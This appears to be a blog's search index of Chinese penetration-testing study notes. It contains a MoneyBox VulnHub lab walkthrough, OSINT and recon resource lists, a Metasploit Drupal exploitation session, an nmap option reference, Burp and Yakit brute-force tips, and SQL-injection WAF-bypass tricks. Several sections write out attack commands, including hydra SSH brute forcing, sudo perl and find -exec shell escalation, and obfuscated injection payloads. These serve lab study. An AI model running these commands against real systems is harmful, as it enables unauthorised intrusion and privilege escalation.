<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>MoneyBox</title>
    <url>/2024/01/04/text24/</url>
    <content><![CDATA[
        <h1 id="一-靶场环境搭建"   >
          <a href="#一-靶场环境搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#一-靶场环境搭建" class="headerlink" title="一.靶场环境搭建"></a>一.靶场环境搭建</h1>
      <p><strong>1.下载安装：<span class="exturl"><a class="exturl__link"   href="https://www.virtualbox.org/" >Oracle VM VirtualBox</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></strong></p>
<p><strong>2.下载moneybox:<span class="exturl"><a class="exturl__link"   href="http://www.vulnhub.com/entry/moneybox-1,653/#download" >http://www.vulnhub.com/entry/moneybox-1,653/#download</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></strong></p>
<p><strong>3.打开VirtualBox点击管理导入虚拟电脑，选择下载好的moneybox</strong></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240104193529791.png" alt="image-20240104193529791"></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240104193746019.png" alt="image-20240104193746019"></p>
<p><strong>4.点击设置更改usb设备为USB1.1控制器，网络，连接方式设置为仅主机网络</strong></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240104194016962.png" alt="image-20240104194016962"></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240104194033552.png" alt="image-20240104194033552"></p>
<p><strong>5.启动导入的moneybox靶机</strong></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240104194225425.png" alt="image-20240104194225425"></p>
<p><strong>6.以管理员身份启动Vmware虚拟机，点击编辑打开虚拟网络编辑器，将桥接模式的外部连接选择Virtualbox Host-Only Ethernet Adapter。</strong></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240104194707216.png" alt="image-20240104194707216"></p>
<p><strong>7.将kali虚拟机的网络设配器设置为桥接模式，网络适配器2设置为NAT。</strong></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240104194953857.png" alt="image-20240104194953857"></p>
<p><strong>8.启动kali验证环境是否搭建成功，输入arp-scan -l -I eth0可以看到192.168.56.101靶机的ip可以输入IP进入网站查看</strong></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240104195405410.png" alt="image-20240104195405410"></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240104195522969.png" alt="image-20240104195522969"></p>

        <h1 id="二-MoneyBox打靶流程"   >
          <a href="#二-MoneyBox打靶流程" class="heading-link"><i class="fas fa-link"></i></a><a href="#二-MoneyBox打靶流程" class="headerlink" title="二.MoneyBox打靶流程"></a>二.MoneyBox打靶流程</h1>
      <p><strong>1.nmap -sn 192.168.56.101 （执行 Ping 扫描，而不进行端口扫描。确定主机是否在线。）</strong></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240104200323708.png" alt="image-20240104200323708"></p>
<p><strong>2.nmap -p 1-10000 192.168.56.101（扫描的端口范围是从 1 到 10000）</strong></p>
<p><img src="C:/Users/15386/AppData/Roaming/Typora/typora-user-images/image-20240104200720683.png" alt="image-20240104200720683"></p>
<p><strong>3.发现只有3个端口，nmap -p 21,22,80 -sC 192.168.56.101（扫描目标主机上的 21（FTP）、22（SSH）和80（HTTP）端口，并启用默认的脚本扫描以获取更多关于这些端口和服务的信息。）</strong></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240104201132163.png" alt="image-20240104201132163"></p>
<p><strong>4.dirsearch -u “<span class="exturl"><a class="exturl__link"   href="http://192.168.56.101/" >http://192.168.56.101</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>“ -x401,403,404（使用 <code>dirsearch</code> 工具对目标网站 “<span class="exturl"><a class="exturl__link"   href="http://192.168.56.101/" >http://192.168.56.101</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>“ 进行目录和文件的枚举，并排除了未授权、禁止访问和未找到的状态码。）</strong></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/Money%20Box2.jpeg" alt="img"></p>
<p><strong>5.进入扫描出的blogs目录，查看源代码可以发现给出了提示</strong></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/Money4.jpeg" alt="img"></p>
<p><strong>6，进入提示信息的页面，再次查看源代码发现给出了个key</strong></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/money5.jpeg" alt="img"></p>
<p><strong>7.根据之前第3步的扫描结果看到ftp登录是开放的可以通过用户名Anonmous密码Anonmous登录，进入ftp目录通过ls发现有张图片，然后get+图片名进行下载（默认下载到桌面）</strong></p>
<p><img src="file:///C:/Users/15386/AppData/Local/Packages/Microsoft.Windows.Photos_8wekyb3d8bbwe/TempState/ShareServiceTempFolder/money6.jpeg" alt="img"></p>
<p><strong>8.通过strings二进制查看图片发现藏着东西</strong></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/money7.jpeg" alt="img"></p>
<p><strong>9.通过steghide info trytofind.jpg命令知道图片确实还有其他文件</strong></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/money8.jpeg" alt="img"></p>
<p><strong>10.通过steghide extract -sf trytofind.jpg进行文件分离，并查看分离出的文件内容</strong>，<strong>知道用户名为renu</strong></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/money9.jpeg" alt="img"></p>
<p><strong>11.进行密码字典爆破1.txt为自定义字典名字。hydra -l renu -P .&#x2F;1.txt ssh:&#x2F;&#x2F;192.168.56.101</strong></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/money11.jpeg" alt="img"></p>
<p><strong>12.知道用户名和密码后直接ssh登录,查看文件得到第一个flag</strong></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/money12.jpeg" alt="img"></p>
<p><strong>13.执行cat .bash_history，查询历史命令发现不用密码可以登录另外一个lily用户</strong></p>
<h5 id=""><a href="#" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/money13.jpeg" alt="img"></h5><p><strong>14.登录lily用户查看文件得到第二个flag</strong></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/money14.jpeg" alt="img"></p>
<p><strong>15.发现可以sudo来运行perl</strong></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/money15.jpeg" alt="img"></p>
<p><strong>16.sudo perl -e ‘exec “&#x2F;bin&#x2F;bash”;’成功进入shell,进入root用户，密码就是之前得到的key查看root.txt得到最后的flag完成靶场</strong></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240104204143752.png" alt="image-20240104204143752"></p>
]]></content>
  </entry>
  <entry>
    <title>信息收集2</title>
    <url>/2024/01/03/text23/</url>
    <content><![CDATA[
        <h3 id="1-主域名资产收集"   >
          <a href="#1-主域名资产收集" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-主域名资产收集" class="headerlink" title="1.主域名资产收集"></a>1.主域名资产收集</h3>
      <p> <strong>(1）ICP备案查询</strong><br><span class="exturl"><a class="exturl__link"   href="https://beian.miit.gov.cn/#/Integrated/index" >https://beian.miit.gov.cn/#/Integrated/index</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	工信部备案<br><span class="exturl"><a class="exturl__link"   href="https://www.beian.gov.cn/portal/registerSystemInfo" >https://www.beian.gov.cn/portal/registerSystemInfo</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	公安备案<br><span class="exturl"><a class="exturl__link"   href="http://icp.chinaz.com/" >http://icp.chinaz.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	站长之家<br><span class="exturl"><a class="exturl__link"   href="https://www.aizhan.com/cha/" >https://www.aizhan.com/cha/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	爱站网</p>
<p>  <strong>(2）Whois查询包括在线网站和邮箱反查</strong><br>     注册域名的时候留下的信息。比如域名注册人的邮箱、电话号码、姓名等。根据这些信息可以尝试制作社工密码，或者查出更多的资产等等，也可以反查注册人，邮箱，电话，机构及更多的域名。<br><span class="exturl"><a class="exturl__link"   href="https://beian.miit.gov.cn/#/Integrated/index" >https://beian.miit.gov.cn/#/Integrated/index</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	工信部备案网站<br><span class="exturl"><a class="exturl__link"   href="https://www.beian.gov.cn/portal/registerSystemInfo" >https://www.beian.gov.cn/portal/registerSystemInfo</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	公安备案网站<br><span class="exturl"><a class="exturl__link"   href="http://whois.chinaz.com/" >http://whois.chinaz.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	站长之家<br><span class="exturl"><a class="exturl__link"   href="https://whois.aizhan.com/" >https://whois.aizhan.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	爱站网<br><span class="exturl"><a class="exturl__link"   href="https://webwhois.cnnic.cn/WelcomeServlet" >https://webwhois.cnnic.cn/WelcomeServlet</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	中国互联网信息中心<br><span class="exturl"><a class="exturl__link"   href="https://whois.cloud.tencent.com/" >https://whois.cloud.tencent.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	腾讯云<br><span class="exturl"><a class="exturl__link"   href="https://whois.aliyun.com/" >https://whois.aliyun.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	阿里云<br><span class="exturl"><a class="exturl__link"   href="http://whois.xinnet.com/domain/whois/index.jsp" >http://whois.xinnet.com/domain/whois/index.jsp</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	新网<br><strong>反查邮箱链接</strong>	<br><span class="exturl"><a class="exturl__link"   href="https://bbs.fobshanghai.com/checkemail.html" >https://bbs.fobshanghai.com/checkemail.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	福人<br><span class="exturl"><a class="exturl__link"   href="https://www.benmi.com/rwhois" >https://www.benmi.com/rwhois</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	whois反查<br><span class="exturl"><a class="exturl__link"   href="http://whois.chinaz.com/reverse?ddlSearchMode=1" >http://whois.chinaz.com/reverse?ddlSearchMode=1</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	站长工具<br><span class="exturl"><a class="exturl__link"   href="https://phonebook.cz/" >https://phonebook.cz</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	phonebook<br><span class="exturl"><a class="exturl__link"   href="https://hunter.io/" >https://hunter.io/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	hunter</p>

        <h3 id="2-子域名资产收集"   >
          <a href="#2-子域名资产收集" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-子域名资产收集" class="headerlink" title="2.子域名资产收集"></a><strong>2.子域名资产收集</strong></h3>
      <p>​     <strong>(1）DNS域传送</strong><br>​      DNS服务器分为主服务器，备份服务器，缓存服务器。<br>​      域传送是指备份服务器从主服务器上复制数据，然后更新自身的数据库，以达到数据同步的目的，这样是为了增加冗余，一旦主服务器出现问题可直接让备份服务器做好支撑工作。<br>​      而域传送漏洞则是由于DNS配置不当，导致匿名用户可以获取某个域的所有记录，造成整个网络的拓扑结构泄露给潜在的攻击者，凭借这份网络蓝图，攻击者可以节省大量的扫描时间，同时提升了目标的准确度。<br>​      DNS域传送漏洞检测方式有三种：nslookup，dig，和使用nmap脚本。</p>
<p>  <strong>(2)通过搜索引擎</strong></p>
<p>   通过谷歌、百度、等hack搜索语法搜索子域名。</p>
<p><strong>谷歌hack语法</strong></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240103204714338.png" alt="image-20240103204714338"></p>
<p> <strong>(3）通过网络空间搜索引擎</strong><br><span class="exturl"><a class="exturl__link"   href="https://www.zoomeye.org/" >https://www.zoomeye.org/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	钟馗之眼<br><span class="exturl"><a class="exturl__link"   href="https://fofa.info/" >https://fofa.info/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	fofa<br><span class="exturl"><a class="exturl__link"   href="https://www.shodan.io/" >https://www.shodan.io/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	shadon<br><span class="exturl"><a class="exturl__link"   href="https://hunter.qianxin.com/" >https://hunter.qianxin.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	鹰图<br><span class="exturl"><a class="exturl__link"   href="https://quake.360.cn/" >https://quake.360.cn/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	360    6）一些在线网站子域名查询<br>  <strong>（4）一些在线网站子域名查询</strong><br><span class="exturl"><a class="exturl__link"   href="https://site.ip138.com/" >https://site.ip138.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	查询网<br><span class="exturl"><a class="exturl__link"   href="https://phpinfo.me/domain/" >https://phpinfo.me/domain/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	在线子域名查询<br><span class="exturl"><a class="exturl__link"   href="http://tool.chinaz.com/" >http://tool.chinaz.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	站长之家</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240103205414398.png" alt="image-20240103205414398"></p>
<p><span class="exturl"><a class="exturl__link"   href="https://www.t1h2ua.cn/tools/" >https://www.t1h2ua.cn/tools/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	子域名扫描<br><span class="exturl"><a class="exturl__link"   href="https://dnsdumpster.com/" >https://dnsdumpster.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	dnsdumpster<br><span class="exturl"><a class="exturl__link"   href="http://dns.aizhan.com/" >http://dns.aizhan.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	爱站<br>     <strong>（5）子域名爆破工具</strong></p>
<p><span class="exturl"><a class="exturl__link"   href="https://github.com/euphrat1ca/LayerDomainFinder" >https://github.com/euphrat1ca/LayerDomainFinder</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>    layer子域名挖掘机</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240103205203033.png" alt="image-20240103205203033"></p>
<p><strong>（6）web finder小米范（目录扫描器）</strong></p>
<p><span class="exturl"><a class="exturl__link"   href="http://pan.baidu.com/s/1pLjaQKF" >http://pan.baidu.com/s/1pLjaQKF</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>到Java1.8的bin目录下面运行（web finder也放到该目录）java -jar  web_finder_2.9.jar</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240105151653739.png" alt="image-20240105151653739"></p>

        <h3 id="3-绕过CDN寻找真实IP"   >
          <a href="#3-绕过CDN寻找真实IP" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-绕过CDN寻找真实IP" class="headerlink" title="3.绕过CDN寻找真实IP"></a><strong>3.绕过CDN寻找真实IP</strong></h3>
      <p><strong>(1)多地ping。</strong></p>
<p><span class="exturl"><a class="exturl__link"   href="http://ping.chinaz.com/" >http://ping.chinaz.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240103205902453.png" alt="image-20240103205902453"></p>
<p>尝试在ip前面加上https:或直接点击进入ip看是否有相关内容页面</p>
<p><strong>（2）fofa来进行内容匹配，然后逐个查看。</strong></p>
<p>“qq.com” &amp;&amp; country&#x3D;”CN” &amp;&amp; body&#x3D;”腾讯公司版权所有”</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240103210543180.png" alt="image-20240103210543180"></p>
]]></content>
  </entry>
  <entry>
    <title>信息收集1,nmap</title>
    <url>/2024/01/01/text22/</url>
    <content><![CDATA[
        <h1 id="信息收集1"   >
          <a href="#信息收集1" class="heading-link"><i class="fas fa-link"></i></a><a href="#信息收集1" class="headerlink" title="信息收集1"></a>信息收集1</h1>
      <p>1.信息收集大概内容</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240101185111795.png" alt="image-20240101185111795"></p>
<p>2.web打点</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240103195632650.png" alt="image-20240103195632650"></p>
<p>3.目录扫描，提权维权实验</p>
<ol>
<li><p><code>dirsearch -u &quot;http://192.168.30.139&quot; -x 403,404</code>:</p>
<ul>
<li>使用 <code>dirsearch</code> 工具对指定的 URL (<code>http://192.168.30.139</code>) 进行目录扫描。</li>
<li><code>-x 403,404</code> 参数指定要排除的 HTTP 响应状态码。</li>
</ul>
</li>
<li><p><code>msfconsole</code>:</p>
<ul>
<li><p>启动 Metasploit 框架的控制台。</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%861.jpeg" alt="img"></p>
</li>
</ul>
</li>
<li><p><code>search drupal</code>:</p>
<ul>
<li><p>在 Metasploit 中搜索与 Drupal 相关的模块。</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%862.jpeg" alt="img"></p>
</li>
</ul>
</li>
<li><p><code>use 2</code>:</p>
<ul>
<li>选择 Metasploit 模块编号为 2 的模块，开始配置该模块以进行漏洞利用。</li>
</ul>
</li>
<li><p><code>show options</code>:</p>
<ul>
<li>显示当前选定模块的配置选项。</li>
</ul>
</li>
<li><p><code>set rhosts 192.168.2.88</code>:</p>
<ul>
<li>设置远程主机的 IP 地址为 <code>192.168.2.88</code>。</li>
</ul>
</li>
<li><p><code>run</code>:</p>
<ul>
<li>运行 Metasploit 模块以执行漏洞利用。</li>
</ul>
</li>
<li><p><code>shell</code>:</p>
<ul>
<li><p>获取一个交互式的系统 shell。</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%863.jpeg" alt="img"></p>
</li>
</ul>
</li>
<li><p><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code>:</p>
<ul>
<li>提高 shell 交互性，以便更好地进行命令执行。</li>
</ul>
</li>
<li><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code>:</p>
<ul>
<li>在文件系统中查找所有属于 root 用户并且设置 SUID 权限的文件。</li>
</ul>
</li>
<li><p><code>find / -name cron.php -exec &quot;/bin/sh&quot; \;</code>:</p>
<ul>
<li><p>在文件系统中查找所有名为 <code>cron.php</code> 的文件，并执行 <code>/bin/sh</code>。</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%864.png" alt="信息收集4"></p>
</li>
</ul>
</li>
</ol>

        <h1 id="nmap"   >
          <a href="#nmap" class="heading-link"><i class="fas fa-link"></i></a><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1>
      <p><strong>nmap简介</strong><br>nmap是一款非常强大的主机发现和端口扫描工具，而且nmap运用自带的脚本，还能完成漏洞检测，同时支持多平台。</p>
<p><strong>nmap常用命令</strong><br><strong>主机发现</strong> </p>
<p>iR                                                                随机选择目标</p>
<p>-iL                                                                从文件中加载IP地址</p>
<p>-sL                                                               简单的扫描目标</p>
<p>-sn                                                               Ping扫描-禁用端口扫描</p>
<p>-Pn                                                              将所有主机视为在在线，跳过主机发现</p>
<p>-PS[portlist]                                              （TCP SYN ping） 需要root权限</p>
<p>-PA[portlist]                                              （TCP ACK ping）</p>
<p>-PU[portlist]                                              （UDP  ping）</p>
<p>-PY [portlist]                                             （SCTP ping）</p>
<p>-PE&#x2F;PP&#x2F;PM                                                 ICMP回显，时间戳和网络掩码请求探测</p>
<p>-PO[协议列表]                                            IP协议Ping</p>
<p>-n&#x2F;-R                                                           从不执行DNS解析&#x2F;始终解析[默认：有时]</p>
<p>–dns-servers                                              指定自定义DNS服务器</p>
<p>–system-dns                                              使用OS的dns服务器</p>
<p>–traceroute                                                跟踪到每个主机的跃点路径</p>
<p><strong>扫描技术</strong></p>
<p>-sS                                                             使用TCP的SYN进行扫描</p>
<p>-sT                                                             使用TCP进行扫描</p>
<p>-sA                                                            使用TCP的ACK进行扫描</p>
<p>-sU                                                            UDP扫描</p>
<p>-sI                                                             Idle扫描</p>
<p>-sF                                                            FIN扫描</p>
<p>-b&lt;FTP中继主机&gt;                                     FTP反弹扫描</p>
<p><strong>端口规格和扫描顺序</strong></p>
<p>-p                                                              扫描指定端口</p>
<p>–exclude-ports                                         从扫描中排除指定端口</p>
<p>-f                                                               快速模式-扫描比默认扫描更少的端口</p>
<p>-r                                                               连续扫描端口-不随机化</p>
<p>–top-ports                                                 扫描<number>最常用的端口</p>
<p><strong>服务&#x2F;版本探测</strong></p>
<p>-sV                                                            探测服务&#x2F;版本信息</p>
<p>–version-intensity                                     设置版本扫描强度（0-9）</p>
<p>–version-all                                              尝试每个强度探测</p>
<p>–version-trace                                          显示详细的版本扫描活动（用于调试）</p>
<p><strong>脚本扫描</strong></p>
<p>-SC                                                           等效于 –script&#x3D;defult</p>
<p>–script &#x3D; <lua scripts>,<lua scripts>        以逗号分隔的目录，脚本文件或脚本类别</p>
<p>–script-args &#x3D; &lt;n1&#x3D;v1, n2&#x3D;v2&gt;               为脚本提供参数</p>
<p>–script-args-file&#x3D;文件名                          从文件名中加载脚本参数</p>
<p>–script-trace                                            显示发送和接受的所有数据</p>
<p>–script-updatedb                                     更新脚本数据库</p>
<p>–script-help&#x3D;<lua scripts>                      显示有关脚本的帮助</p>
<p><strong>操作系统检测</strong></p>
<p>-o                                                            启用os检测</p>
<p>–osscan-limit                                          将os检测限制为可能的目标</p>
<p>–osscan-guess                                       推测操作系统检测结果</p>
<p>时间和性能</p>
<p>–host-timeout                                         设置超时时间</p>
<p>–scan-delay                                           设置探测之间的时间间隔</p>
<p>-T  &lt;0-5&gt;                                                设置时间模板,值越小，IDS报警几率越低</p>
<p><strong>防火墙&#x2F;IDS规避和欺骗</strong></p>
<p>-f                                                             报文分段</p>
<p>-s                                                             欺骗源地址</p>
<p>-g                                                            使用指定的本机端口</p>
<p>–proxies &lt;url,port&gt;                                 使用HTTP&#x2F;SOCK4代理</p>
<p>-data<hex string>                                   想发送的数据包中追加自定义的负载</p>
<p>–data-string                                            将自定义的ACSII字符串附加到发送数据包中   </p>
<p>–data-length                                           发送数据包时，附加随机数据</p>
<p>–spoof-mac                                            MAC地址欺骗</p>
<p>–badsum                                                发送带有虚假TCP&#x2F;UNP&#x2F;STCP校验和的数据包</p>
<p><strong>输出</strong></p>
<p>-oN                                                         标准输出</p>
<p>-oX                                                         XMl输出</p>
<p>-oS                                                         script jlddi3</p>
<p>-oG                                                        grepable</p>
<p>-oA                                                         同时输出三种主要格式</p>
<p>-v                                                           信息详细级别</p>
<p>-d                                                           调试级别</p>
<p>–packet-trace                                        跟踪发送和接收的报文</p>
<p>–reason                                                 显示端口处于特殊状态的原因</p>
<p>–open                                                    仅显示开放的端口</p>
<p><strong>杂项</strong></p>
<p>-6                                                          启动Ipv6扫描</p>
<p>-A                                                          启动Os检测，版本检测，脚本扫描和traceroute</p>
<p>-V                                                          显示版本号</p>
<p>-h                                                          帮助信息</p>
]]></content>
  </entry>
  <entry>
    <title>SQL5</title>
    <url>/2023/12/31/text21/</url>
    <content><![CDATA[
        <h1 id="yakit"   >
          <a href="#yakit" class="heading-link"><i class="fas fa-link"></i></a><a href="#yakit" class="headerlink" title="yakit"></a>yakit</h1>
      <p>1.选择一个默认的数据库</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231231212339734.png" alt="image-20231231212339734"></p>
<p>2.点击MITM</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231231212502553.png" alt="image-20231231212502553"></p>
<p>3.选择免配置启动（默认要安装谷歌浏览器）</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231231212620923.png" alt="image-20231231212620923"></p>
<p>4.在打开的谷歌浏览器输入想抓包的网址提交请求可以在yakit看到发送的请求包</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231231213141703.png" alt="image-20231231213141703"></p>
<p><img src="C:/Users/15386/AppData/Roaming/Typora/typora-user-images/image-20231231213208084.png" alt="image-20231231213208084"></p>
<p>5.点击FUZZ，可以进去构造请求包，可注入的位置各有不同</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1703646436446-c1a73188-5dbf-4e40-8290-d9050ff10927.png" alt="image.png"></p>
<p>6.右键功能菜单可以帮助构建请求包，插入字典爆破密码</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240105150455782.png" alt="image-20240105150455782"></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231231213510950.png" alt="image-20231231213510950"></p>
<p>7.可以手动劫持请求，比如要爆破密码但要每次刷新验证码，输入一个正确的验证码然后劫持爆破出正确的密码再放行</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240105150226965.png" alt="image-20240105150226965"></p>

        <h1 id="burp"   >
          <a href="#burp" class="heading-link"><i class="fas fa-link"></i></a><a href="#burp" class="headerlink" title="burp"></a>burp</h1>
      <p>1.可以临时项目也可以新建</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231231213736376.png" alt="image-20231231213736376"></p>
<p>2.直接启动burp</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231231213811378.png" alt="image-20231231213811378"></p>
<p>3.点击代理打开内嵌浏览器</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231231213945613.png" alt="image-20231231213945613"></p>
<p>4.和yakit一样输入要发&#x2F;抓包的地址</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231231214110734.png" alt="image-20231231214110734"></p>
<p>5.点击历史记录</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231231214148048.png" alt="image-20231231214148048"></p>
<p>6.选择一个进行</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231231214246278.png" alt="image-20231231214246278"></p>
<p>7.发送到Intruder可以进行构造payload爆破</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231231214449113.png" alt="image-20231231214449113"></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231231214526199.png" alt="image-20231231214526199"></p>
<p>8.可以在payload处进行设置选择爆破方式</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231231214952925.png" alt="image-20231231214952925"></p>
<p>9.发送到Repeater（重放器）可以和yakit一样单次发送</p>
<p><img src="C:/Users/15386/AppData/Roaming/Typora/typora-user-images/image-20231231214826319.png" alt="image-20231231214826319"></p>

        <h1 id="waf-绕狗"   >
          <a href="#waf-绕狗" class="heading-link"><i class="fas fa-link"></i></a><a href="#waf-绕狗" class="headerlink" title="waf:绕狗"></a>waf:绕狗</h1>
      <p>注意：当某种安全设备的绕过方式在公网上可以大量搜索到，那大概率这种方式已经无法绕过了（因为WAF规则库一直在更新），这里介绍的绕过方式是给初学者提供一个思路。<br>WAF绕过实质：让WAF的检测规则，识别不到所输入的敏感字符，既利用WAF规则漏洞进行绕过。<br>1.数据方面：<br>（1）大小写绕过 如：union select 改为 UniON SeLeCt<br>（2）参数加解密绕过 如：database()使用base64加密为 ZGF0YWJhc2UoKQ&#x3D;&#x3D;。<br>（3）参数编码解码绕过 针对WAF过滤的字符编码，如使用URL编码，Unicode编码，十六进制编码，Hex编码等。<br>（4）使用特殊符号绕过<br>（5）反序列化绕过<br>（6）使用等价函数、同义符号绕过 如：and 等价于&amp;&amp;<br>（7）注释符混用绕过</p>
<p>（8）内联注释绕过 如：安全狗对database()函数进行拦截，因此，可以改写为database&#x2F;* &#x2F;( ) 或 union selecte &#x3D;&#x2F;!union*&#x2F; select，注释符里感叹号后面的内容会被mysql执行。<br>（9）双关键字绕过 如：script 写为 ScscriptRipt<br>（10）HTTP参污染 对目标发送多个参数，如果目标没有多参数进行多次过滤，那么WAF对多个参数只会识别其中的一个。如：?id&#x3D;1&#x2F;**&amp;id&#x3D;2&amp;id&#x3D;3 或 ?id&#x3D;1&#x2F;**&amp;id&#x3D;-1%20union%20select%201,2,3%23*&#x2F;<br>（11）换行（\N）绕过</p>
<p>2.数据提交方式方面：<br>（1）更改数据提交方式 如：get提交方式 改为 post提交方式</p>
]]></content>
  </entry>
  <entry>
    <title>SQL4</title>
    <url>/2023/12/28/text20/</url>
    <content><![CDATA[
        <h1 id="堆叠注入"   >
          <a href="#堆叠注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1>
